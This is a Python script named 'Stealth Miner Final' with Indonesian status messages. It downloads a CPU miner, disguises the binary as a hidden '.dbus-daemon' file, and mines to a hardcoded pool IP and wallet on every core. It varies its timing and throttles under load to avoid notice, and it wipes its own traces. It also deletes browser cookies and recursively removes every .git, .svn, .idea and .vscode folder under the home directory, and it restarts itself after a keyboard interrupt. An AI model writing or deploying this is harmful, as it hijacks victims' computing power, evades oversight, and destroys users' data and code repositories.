#!/usr/bin/env python3

import os
import subprocess
import urllib.request
import tarfile
import time
import threading
import shutil
import sys
import random

URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://164.92.145.122:5357"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def is_cpu_100_percent():
    try:
        load = os.getloadavg()[0]
        cores = os.cpu_count()
        return load >= cores
    except:
        return False

def should_restart():
    global cooldown_restart_counter, cooldown_reset_time
    if time.time() > cooldown_reset_time:
        cooldown_restart_counter = 0
        cooldown_reset_time = time.time() + 3600
    if cooldown_restart_counter < cooldown_restart_limit:
        cooldown_restart_counter += 1
        return True
    return False

def clean_myapp_data():
    TARGETS = [
        os.path.expanduser("~/MyAppExplore"),
        os.path.expanduser("~/.local/share/myapp"),
        os.path.expanduser("~/Downloads/MyApp"),
    ]
    for path in TARGETS:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)
                print(f"[馃Ч] Menghapus folder: {path}")
            except Exception as e:
                print(f"[X] Gagal hapus {path}: {e}")

def clean_mining_artifacts():
    PATTERNS = ["cpuminer", "power2b", "rplant", "miner", "mining", "hashrate"]
    TARGET_DIRS = [
        os.path.expanduser("~/.cache"),
        os.path.expanduser("~/.local/share"),
        os.path.expanduser("~/Downloads"),
        "/tmp"
    ]
    for base in TARGET_DIRS:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            for name in files:
                if any(keyword in name.lower() for keyword in PATTERNS):
                    try:
                        os.remove(os.path.join(root, name))
                        print(f"[馃Ч] Hapus file: {os.path.join(root, name)}")
                    except:
                        pass

def clean_browser_cookies():
    COOKIE_PATHS = [
        os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
        os.path.expanduser("~/.config/chromium/Default/Cookies"),
        os.path.expanduser("~/.mozilla/firefox/"),
        os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Cookies"),
        os.path.expanduser("~/.config/opera/Default/Cookies")
    ]
    for path in COOKIE_PATHS:
        if os.path.isfile(path):
            try:
                os.remove(path)
                print(f"[馃崻] Cookie dihapus: {path}")
            except:
                pass
        elif os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if "cookie" in file.lower():
                        try:
                            os.remove(os.path.join(root, file))
                            print(f"[馃崻] Cookie dihapus: {file}")
                        except:
                            pass

def clean_tracking_artifacts():
    TRACKING_DIRS = [
        os.path.expanduser("~/.config/.tracking"),
        os.path.expanduser("~/.cache/tracker"),
        os.path.expanduser("~/AppData/Local/Temp/Tracking")
    ]
    for path in TRACKING_DIRS:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)
                print(f"[馃Ч] Tracking folder dihapus: {path}")
            except:
                pass

def clean_source_control():
    CONTROL_DIRS = [".git", ".svn", ".hg", ".bzr", ".idea", ".vscode", "__pycache__"]
    BASE_DIRS = [
        os.path.expanduser("~"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/.cache"),
        os.path.expanduser("~/.local/share"),
        "/tmp"
    ]
    for base in BASE_DIRS:
        if not os.path.exists(base):
            continue
        for root, dirs, files in os.walk(base):
            for d in dirs:
                if d in CONTROL_DIRS:
                    path = os.path.join(root, d)
                    try:
                        shutil.rmtree(path)
                        print(f"[馃梻锔廬 Kontrol sumber dihapus: {path}")
                    except:
                        pass

def clean_miner_cache():
    try:
        if os.path.exists(TARFILE):
            os.remove(TARFILE)
            print("[馃Ч] Menghapus arsip miner lama.")
        if os.path.exists(HIDDEN_DIR):
            shutil.rmtree(HIDDEN_DIR)
            print("[馃Ч] Menghapus direktori binary tersembunyi.")
    except Exception as e:
        print(f"[X] Gagal bersihkan cache miner: {e}")

def fake_http_headers():
    headers = [
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Referer: https://google.com/",
        "Connection: keep-alive",
        "X-Forwarded-For: 127.0.0.1",
    ]
    os.environ["FAKE_HEADERS"] = "|".join(headers)

def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    print("[*] Mengunduh miner...")
    urllib.request.urlretrieve(URL, TARFILE)
    print("[*] Mengekstrak...")
    with tarfile.open(TARFILE) as tar:
        tar.extractall()
    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[*] Menambang selama {duration} detik dengan {THREADS} thread...")
    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    os.remove(TARFILE)
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[鉀擼 CPU 100%! Cooldown selama {COOLDOWN_DURATION} detik...")
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            time.sleep(COOLDOWN_DURATION)
            if should_restart():
                restart_script()
            else:
                print("[鈿狅笍] Batas restart tercapai.")
                return
    print("[鉁旓笍] Durasi selesai. Menghentikan miner...")
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

def main_loop():
    while True:
        clean_mining_artifacts()
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[鈴革笍] Istirahat {pause} detik...
")
        time.sleep(pause)

def restart_script():
    try:
        print("[馃攣] Restart otomatis...")
        clean_miner_cache()
        clean_myapp_data()
        clean_mining_artifacts()
        time.sleep(5)
        subprocess.Popen([sys.executable] + sys.argv)
        print("[馃殌] Script telah di-restart.")
        sys.exit(0)
    except Exception as e:
        print(f"[X] Gagal restart otomatis: {e}")

if __name__ == "__main__":
    print("馃殌  Stealth Miner Final")
    clean_myapp_data()
    clean_browser_cookies()
    clean_tracking_artifacts()
    clean_source_control()
    fake_http_headers()
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user.")
        restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
